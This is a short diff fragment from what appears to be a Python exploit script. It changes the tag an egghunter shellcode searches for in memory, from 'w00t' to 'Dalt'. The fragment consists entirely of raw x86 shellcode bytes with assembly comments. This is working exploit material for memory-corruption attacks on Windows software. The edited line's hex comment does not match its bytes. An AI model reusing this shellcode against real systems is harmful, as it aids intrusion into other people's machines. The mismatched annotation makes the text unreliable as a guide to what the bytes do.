@@ -18,7 +18,7 @@ eggh = (
 "\x5a"                                # POP EDX
 "\x3C\x05"      					  # CMP AL,5
 "\x74\xe9"      					  # JE SHORT egg.0043F000
-"\xB8\x77\x30\x30\x74"       		  # MOV EAX,74303077 w00t
+"\xB8\x44\x61\x6c\x74"       		  # MOV EAX,44716c74 Dalt
 "\x8B\xFA"                            # MOV EDI,EDX
 "\xAF"                                # SCAS DWORD PTR ES:[EDI]
 "\x75\xe4"                            # JNZ SHORT egg.0043F001
